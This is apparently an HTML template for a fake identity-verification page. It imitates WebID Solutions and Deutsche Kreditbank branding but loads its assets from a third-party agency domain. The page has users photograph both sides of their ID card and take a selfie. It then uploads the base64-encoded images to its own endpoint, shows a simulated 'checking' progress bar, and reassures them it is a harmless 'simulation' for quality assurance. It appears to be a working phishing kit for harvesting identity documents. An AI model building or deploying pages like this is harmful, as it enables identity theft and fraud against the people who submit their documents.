<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>WebID Solutions - Your True Identity Company</title>
  <link href="https://webid.phnl-agentur.de/service/v3/style/main.css?b=2373" rel="stylesheet" />
  <style>
    #simulation-warning{position:fixed;top:0;left:0;width:100%;background:red;color:#fff;text-align:center;font-size:18px;font-weight:700;padding:10px;z-index:9999}
    body.webid{padding-top:44px;background:#dfe1e5}
    .container{max-width:960px;width:min(96vw,960px);margin:0 auto;background:#fff}
    .heading{font-size:18px}
    .steps-container{display:flex;flex-wrap:wrap;margin:1em 0}
    .step-all{flex:2}
    .step-with-border{border-left:thick solid #05b1fb;padding-left:.5em}
    .step-header{font-weight:700}
    .app-notice{font-weight:700;font-size:1.3em}
    .sim-overlay{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:10000;display:flex;align-items:center;justify-content:center}
    .sim-modal{background:#2a2a2a;color:#fff;padding:22px 24px;border-radius:2px;text-align:center;max-width:320px}
    .sim-modal h3{margin:0 0 10px;font-size:18px;font-weight:700}
    .sim-modal p{margin:0 0 12px;font-size:14px;line-height:1.5}
    .sim-ok{background:#f00;border:0;color:#fff;padding:8px 14px;font-size:13px;font-weight:700;border-radius:2px}
    .manual-blue{background:#19a9e3;color:#fff;display:grid;grid-template-columns:90px 1fr;gap:14px;padding:18px;align-items:center}
    .manual-blue .bang{width:60px;height:60px;border:3px solid rgba(255,255,255,.65);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;font-weight:700}
    .manual-blue p{margin:0;font-size:12px;line-height:1.4}
    .manual-blue .btn{margin-top:10px;border:1px solid #8ecde8;background:transparent;color:#fff;padding:7px 14px;border-radius:2px;font-size:12px}
    .doc-step{display:none;border:1px solid #bce4f4;padding:14px;margin-top:10px}
    .doc-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
    .doc-shot{background:#f3f3f3;border-radius:2px;padding:10px;margin-bottom:0}
    .doc-shot .ph{height:190px;border:1px solid #e1e1e1;border-radius:2px;background:#e8e8e8;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
    .doc-shot .ph img.preview{width:100%;height:100%;object-fit:cover;display:none}
    .doc-shot .ph .hint{opacity:.9;text-align:center;color:#6b7780;font-size:12px;line-height:1.35;padding:8px}
    .doc-shot .ph .hint img{width:120px;max-width:65%;height:auto;display:block;margin:0 auto 10px auto}
    .doc-shot button{width:100%;margin-top:8px;border:2px solid #95cfe4;background:#fff;border-radius:2px;padding:6px 8px;font-size:12px}
    .doc-shot input[type=file]{display:none}
    .doc-footerline{display:flex;justify-content:space-between;align-items:center;margin-top:10px}
    .doc-actions{text-align:right}
    .doc-actions button{background:#18a8e2;color:#fff;border:1px solid #75c4e8;border-radius:4px;padding:6px 11px;font-size:12px}
    .doc-actions button[disabled]{opacity:.55;cursor:not-allowed}
    .checking-wrap{padding:18px;border:1px solid #bce4f4;background:#f8fdff}
    .checking-title{font-weight:700;margin:0 0 8px 0}
    .checking-bar{height:10px;border-radius:999px;background:#d9eef8;overflow:hidden}
    .checking-bar>span{display:block;height:100%;width:0%;background:#18a8e2;transition:width .25s ease}
    .checking-status{margin:10px 0 0 0;color:#456}
    @media (max-width:900px){.container{width:100vw;max-width:100vw}.page-header img{width:100%;height:auto}.content-padding{padding:12px}.doc-shot .ph{height:180px}}
    @media (max-width:700px){.doc-grid{grid-template-columns:1fr}.doc-footerline{display:grid;gap:10px}.doc-actions{text-align:left}}
    @media (max-width:500px){.steps-container{flex-direction:column}.step-with-border{border-left:none;border-top:thick solid #05b1fb;padding-left:0;padding-top:.5em}.manual-blue{grid-template-columns:1fr;padding:14px}.manual-blue .bang{width:48px;height:48px;font-size:28px}.sim-modal{max-width:300px;padding:16px}.sim-modal h3{font-size:16px}.sim-modal p{font-size:13px}.doc-shot button{font-size:13px;padding:10px}.doc-actions button{font-size:14px}}

    .cam-modal{position:fixed;inset:0;background:#000;z-index:12000;display:none}
    .cam-top{height:56px;background:#000;display:flex;align-items:center;justify-content:space-between;padding:0 12px;color:#fff}
    .cam-top button{background:transparent;border:0;color:#fff;font-size:24px;line-height:1}
    .cam-stage{position:relative;height:calc(100vh - 130px);overflow:hidden}
    .cam-stage video{width:100%;height:100%;object-fit:cover}
    .cam-overlay{position:absolute;left:50%;top:56%;transform:translate(-50%,-50%);width:min(86vw,420px);aspect-ratio:1.586/1;border:4px dotted #17b236;border-radius:24px;box-shadow:0 0 0 9999px rgba(0,0,0,.22)}
    .cam-bottom{height:74px;background:#000;display:flex;align-items:center;justify-content:center}
    .cam-capture{width:74px;height:74px;border-radius:999px;border:4px solid #fff;background:#e4251b;color:#fff;font-size:32px;line-height:1}
  </style>
</head>
<body class="webid c000631">
<div id="simulation-warning">⚠️ Simulation: Es findet keine echte Identitätsprüfung statt ⚠️</div>
<div class="container">
  <header class="page-header">
    <img src="https://kbltkdjwueqanlvynnon.supabase.co/storage/v1/object/public/company-assets/webid/header-phnl-neu-2%20(1).png" class="img-responsive" alt="" />
    <div id="action-id-display">Vorgangsnummer: <b><%= caseId %></b></div>
  </header>

  <div class="page-content">
    <div class="row"><div class="col-xs-12"><main class="content-padding">
      <h1 class="heading">Willkommen zur Simulation</h1>
      <div class="steps-container">
        <div class="requirements step-all">
          <div class="step-header">Voraussetzungen:</div>
          <div>• Ausweisdokument bereit</div><div>• Ausreichend Licht</div><div>• Ausweisfoto lesbar und scharf</div>
        </div>
        <div class="step1 step-all step-with-border"><div class="step-header">Schritt 1:</div><div>Machen Sie ein Foto von der Vorder- und Rückseite Ihres Ausweisdokuments.</div></div>
        <div class="step2 step-all step-with-border"><div class="step-header">Schritt 2:</div><div>Machen Sie ein Portraitfoto von sich zum Abgleich. Fertig!</div></div>
      </div>

      <div class="m-t-lg m-b-lg">
        <p class="app-notice"><b>Natürlich können Sie auch die Prüfung mit der Vorgangsnummer <%= caseId %> in unserer My WebID-App für Android und iOS durchführen.</b></p>
        <a href="https://apps.apple.com/de/app/my-webid/id1456365043" target="_blank"><img src="https://webid.phnl-agentur.de/images/AppStore_DE.svg" width="135" alt="My WebID"></a>
        <a href="https://play.google.com/store/apps/details?id=de.webidsolutions.mywebid" target="_blank"><img src="https://webid.phnl-agentur.de/images/PlayStore_DE.svg" width="135" alt="My WebID"></a>
      </div>

      <div id="manual-intro" class="manual-blue">
        <div class="bang">!</div>
        <div>
          <p>Diese Identitätsprüfung wird im Rahmen einer kontrollierten Simulation durchgeführt. Es wird kein echtes Bankkonto eröffnet und es entstehen keine realen finanziellen oder rechtlichen Verpflichtungen. Alle Schritte dienen ausschließlich Testzwecken im Rahmen eines Qualitätssicherungsprojekts.</p>
          <button class="btn" id="btn-weiter" type="button">Weiter</button>
        </div>
      </div>

      <div id="doc-step" class="doc-step">
        <div class="doc-grid">
          <div class="doc-shot">
            <strong>Ausweisvorderseite</strong>
            <div class="ph" id="front-preview-wrap">
              <img class="preview" id="front-preview" alt="Ausweisvorderseite Vorschau" />
              <div class="hint" id="front-hint"><img src="https://webid.phnl-agentur.de/images/auto-ident/v1/id_card_front.svg" alt="Vorderseite Platzhalter" />Vorderseite noch nicht aufgenommen</div>
            </div>
            <input id="front-file" type="file" accept="image/*" capture="environment" />
            <button type="button" id="front-btn">Vorderseite des Ausweisdokuments fotografieren</button>
          </div>

          <div class="doc-shot">
            <strong>Ausweisrückseite</strong>
            <div class="ph" id="back-preview-wrap">
              <img class="preview" id="back-preview" alt="Ausweisrückseite Vorschau" />
              <div class="hint" id="back-hint"><img src="https://webid.phnl-agentur.de/images/auto-ident/v1/id_card_back.svg" alt="Rückseite Platzhalter" />Rückseite noch nicht aufgenommen</div>
            </div>
            <input id="back-file" type="file" accept="image/*" capture="environment" />
            <button type="button" id="back-btn">Rückseite des Ausweisdokuments fotografieren</button>
          </div>
        </div>

        <div class="doc-footerline">
          <p style="margin:0">Tipps für das Fotografieren Ihres Ausweisdokuments erhalten Sie <u>hier</u>.</p>
          <div class="doc-actions"><button id="verify-btn" type="button" disabled>Weiter zu Selfie</button></div>
        </div>
      </div>

      <div id="selfie-step" class="doc-step">
        <div class="doc-grid" style="grid-template-columns:1fr">
          <div class="doc-shot">
            <strong>Selfie (Gesichtsabgleich)</strong>
            <div class="ph" id="selfie-preview-wrap">
              <img class="preview" id="selfie-preview" alt="Selfie Vorschau" />
              <div class="hint" id="selfie-hint"><img src="https://webid.phnl-agentur.de/images/auto-ident/v1/photo_icon.svg" alt="Selfie Platzhalter" />Selfie noch nicht aufgenommen</div>
            </div>
            <input id="selfie-file" type="file" accept="image/*" capture="user" />
            <button type="button" id="selfie-btn">Selfie aufnehmen</button>
          </div>
        </div>
        <div class="doc-footerline">
          <p style="margin:0">Bitte Gesicht gut beleuchtet und vollständig im Bild platzieren.</p>
          <div class="doc-actions"><button id="selfie-next-btn" type="button" disabled>Prüfung starten</button></div>
        </div>
      </div>

      <div id="checking-step" class="doc-step">
        <div class="checking-wrap">
          <p class="checking-title">Daten werden geprüft …</p>
          <div class="checking-bar"><span id="checking-progress"></span></div>
          <p class="checking-status" id="checking-status">Bitte warten</p>
        </div>
      </div>

    </main></div></div>
  </div>

  <footer class="page-footer"><div class="row"><div class="col-lg-12">
    <span id="footerText">Ein Service der Deutsche Kreditbank Aktiengesellschaft, realisiert durch WebID Solutions</span><br />
    <a href="https://www.webid-solutions.com/de/faqs/" target="_blank" class="page-footer-link">Kontakt</a>
    <a href="https://www.webid-solutions.com/de/imprint/" target="_blank" class="page-footer-link">Impressum</a>
    <a href="https://www.webid-solutions.com/de/privacy-policy/" target="_blank" class="page-footer-link">Datenschutz</a>
  </div></div></footer>
</div>

<div class="sim-overlay" id="sim-overlay"><div class="sim-modal"><h3>⚠️ Hinweis: Simulation</h3><p>Bitte beachten Sie, dass dies ein simulierter Test ist und alle im Rahmen dieses Projekts durchgeführten Aktionen keine realen Auswirkungen haben.</p><button class="sim-ok" id="sim-ok" type="button">OK, Verstanden</button></div></div>

<div class="cam-modal" id="cam-modal" aria-hidden="true">
  <div class="cam-top">
    <span id="cam-title">Dokument aufnehmen</span>
    <button id="cam-close" type="button" aria-label="Kamera schließen">×</button>
  </div>
  <div class="cam-stage">
    <video id="cam-video" playsinline autoplay muted></video>
    <div class="cam-overlay"></div>
  </div>
  <div class="cam-bottom">
    <button class="cam-capture" id="cam-capture" type="button" aria-label="Foto aufnehmen">📷</button>
  </div>
</div>

<script>
  document.getElementById('sim-ok')?.addEventListener('click',()=>{document.getElementById('sim-overlay').style.display='none'})
  document.getElementById('btn-weiter')?.addEventListener('click',()=>{document.getElementById('manual-intro').style.display='none';document.getElementById('doc-step').style.display='block'})

  const caseId = '<%= caseId %>';
  const docStep = document.getElementById('doc-step');
  const selfieStep = document.getElementById('selfie-step');
  const checkingStep = document.getElementById('checking-step');

  const frontInput = document.getElementById('front-file');
  const backInput = document.getElementById('back-file');
  const selfieInput = document.getElementById('selfie-file');
  const frontBtn = document.getElementById('front-btn');
  const backBtn = document.getElementById('back-btn');
  const selfieBtn = document.getElementById('selfie-btn');
  const frontPreview = document.getElementById('front-preview');
  const backPreview = document.getElementById('back-preview');
  const selfiePreview = document.getElementById('selfie-preview');
  const frontHint = document.getElementById('front-hint');
  const backHint = document.getElementById('back-hint');
  const selfieHint = document.getElementById('selfie-hint');
  const verifyBtn = document.getElementById('verify-btn');
  const selfieNextBtn = document.getElementById('selfie-next-btn');
  const checkingProgress = document.getElementById('checking-progress');
  const checkingStatus = document.getElementById('checking-status');

  const camModal = document.getElementById('cam-modal');
  const camVideo = document.getElementById('cam-video');
  const camClose = document.getElementById('cam-close');
  const camCapture = document.getElementById('cam-capture');
  const camTitle = document.getElementById('cam-title');
  const camOverlay = document.querySelector('.cam-overlay');

  let frontBlob = null;
  let backBlob = null;
  let selfieBlob = null;
  let frontPreviewUrl = null;
  let backPreviewUrl = null;
  let selfiePreviewUrl = null;
  let camStream = null;
  let camTarget = null;

  function updateVerifyState() {
    if (verifyBtn) verifyBtn.disabled = !(frontBlob && backBlob);
    if (selfieNextBtn) selfieNextBtn.disabled = !selfieBlob;
  }

  function revokeIfNeeded(url) { if (url) URL.revokeObjectURL(url); }

  async function compressImage(fileOrBlob, maxSide = 1600, quality = 0.82) {
    const imageBitmap = await createImageBitmap(fileOrBlob);
    const scale = Math.min(1, maxSide / Math.max(imageBitmap.width, imageBitmap.height));
    const w = Math.max(1, Math.round(imageBitmap.width * scale));
    const h = Math.max(1, Math.round(imageBitmap.height * scale));
    const canvas = document.createElement('canvas');
    canvas.width = w; canvas.height = h;
    canvas.getContext('2d', { alpha: false }).drawImage(imageBitmap, 0, 0, w, h);
    const outBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', quality));
    imageBitmap.close?.();
    return outBlob || fileOrBlob;
  }

  function setPreview(which, blob, previewImg, hintEl) {
    const newUrl = URL.createObjectURL(blob);
    if (which === 'front') { revokeIfNeeded(frontPreviewUrl); frontPreviewUrl = newUrl; frontBlob = blob; }
    else if (which === 'back') { revokeIfNeeded(backPreviewUrl); backPreviewUrl = newUrl; backBlob = blob; }
    else { revokeIfNeeded(selfiePreviewUrl); selfiePreviewUrl = newUrl; selfieBlob = blob; }

    previewImg.src = newUrl;
    previewImg.style.display = 'block';
    if (hintEl) hintEl.style.display = 'none';
    updateVerifyState();
  }

  function stopCamera() {
    if (camStream) camStream.getTracks().forEach((t) => t.stop());
    camStream = null;
    if (camVideo) camVideo.srcObject = null;
  }

  async function openCamera(which) {
    if (!navigator.mediaDevices?.getUserMedia || !camModal || !camVideo) {
      if (which === 'front') frontInput?.click();
      else if (which === 'back') backInput?.click();
      else selfieInput?.click();
      return;
    }

    camTarget = which;
    const isSelfie = which === 'selfie';
    camTitle.textContent = isSelfie ? 'Selfie aufnehmen' : (which === 'front' ? 'Ausweisvorderseite aufnehmen' : 'Ausweisrückseite aufnehmen');
    if (camOverlay) camOverlay.style.display = isSelfie ? 'none' : 'block';
    camModal.style.display = 'block';

    try {
      camStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: isSelfie ? 'user' : 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false,
      });
      camVideo.srcObject = camStream;
      await camVideo.play();
    } catch (err) {
      console.error('camera open failed', err);
      stopCamera();
      camModal.style.display = 'none';
      if (which === 'front') frontInput?.click();
      else if (which === 'back') backInput?.click();
      else selfieInput?.click();
    }
  }

  async function captureFromCamera() {
    if (!camVideo || !camTarget) return;
    const vw = camVideo.videoWidth || 1280;
    const vh = camVideo.videoHeight || 720;

    const isSelfie = camTarget === 'selfie';
    const cropW = Math.round(vw * 0.86);
    const cropH = isSelfie ? Math.round(cropW * 1.2) : Math.round(cropW / 1.586);
    const cw = Math.min(cropW, vw);
    const ch = Math.min(cropH, vh);
    const cx = Math.max(0, Math.round((vw - cw) / 2));
    const cy = Math.max(0, Math.round((vh - ch) / 2));

    const canvas = document.createElement('canvas');
    canvas.width = cw; canvas.height = ch;
    canvas.getContext('2d', { alpha: false }).drawImage(camVideo, cx, cy, cw, ch, 0, 0, cw, ch);

    const rawBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.9));
    const compressed = await compressImage(rawBlob || canvas, 1600, 0.82);

    if (camTarget === 'front') setPreview('front', compressed, frontPreview, frontHint);
    else if (camTarget === 'back') setPreview('back', compressed, backPreview, backHint);
    else setPreview('selfie', compressed, selfiePreview, selfieHint);

    stopCamera();
    camModal.style.display = 'none';
    camTarget = null;
  }

  function wireFallbackInput(which, input, previewImg, hintEl) {
    input?.addEventListener('change', async () => {
      const file = input.files && input.files[0];
      if (!file) return updateVerifyState();
      try {
        const compressed = await compressImage(file);
        setPreview(which, compressed, previewImg, hintEl);
      } catch (err) {
        console.error('image processing failed', err);
        setPreview(which, file, previewImg, hintEl);
      }
    });
  }

  async function blobToBase64(blob) {
    return await new Promise((resolve, reject) => {
      const fr = new FileReader();
      fr.onload = () => resolve(String(fr.result || '').split(',')[1] || '');
      fr.onerror = reject;
      fr.readAsDataURL(blob);
    });
  }

  async function startCheckingAndSubmit() {
    docStep.style.display = 'none';
    selfieStep.style.display = 'none';
    checkingStep.style.display = 'block';

    let p = 8;
    checkingProgress.style.width = p + '%';
    checkingStatus.textContent = 'Dokumente werden validiert …';

    const timer = setInterval(() => {
      p = Math.min(92, p + 7);
      checkingProgress.style.width = p + '%';
      if (p > 40) checkingStatus.textContent = 'Gesicht und Dokument werden abgeglichen …';
      if (p > 75) checkingStatus.textContent = 'Sichere Übertragung wird vorbereitet …';
    }, 220);

    try {
      const payload = {
        caseId,
        frontImageBase64: await blobToBase64(frontBlob),
        backImageBase64: await blobToBase64(backBlob),
        selfieImageBase64: await blobToBase64(selfieBlob),
      };

      const res = await fetch('/api/webid/submit', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data?.error || 'Upload fehlgeschlagen');

      clearInterval(timer);
      checkingProgress.style.width = '100%';
      checkingStatus.textContent = 'Einreichung abgeschlossen. Vorgangsnummer: ' + caseId + '. Sie können dieses Fenster jetzt schließen.';
    } catch (err) {
      clearInterval(timer);
      checkingStatus.textContent = (err?.message || 'Upload fehlgeschlagen') + ' Bitte erneut versuchen.';
      setTimeout(() => {
        checkingStep.style.display = 'none';
        selfieStep.style.display = 'block';
      }, 1200);
    }
  }

  frontBtn?.addEventListener('click', () => openCamera('front'));
  backBtn?.addEventListener('click', () => openCamera('back'));
  selfieBtn?.addEventListener('click', () => openCamera('selfie'));
  camClose?.addEventListener('click', () => { stopCamera(); camModal.style.display = 'none'; camTarget = null; });
  camCapture?.addEventListener('click', captureFromCamera);

  wireFallbackInput('front', frontInput, frontPreview, frontHint);
  wireFallbackInput('back', backInput, backPreview, backHint);
  wireFallbackInput('selfie', selfieInput, selfiePreview, selfieHint);

  verifyBtn?.addEventListener('click', () => {
    docStep.style.display = 'none';
    selfieStep.style.display = 'block';
  });

  selfieNextBtn?.addEventListener('click', startCheckingAndSubmit);

  window.addEventListener('beforeunload', () => {
    stopCamera();
    revokeIfNeeded(frontPreviewUrl);
    revokeIfNeeded(backPreviewUrl);
    revokeIfNeeded(selfiePreviewUrl);
  });
</script>
</body>
</html>
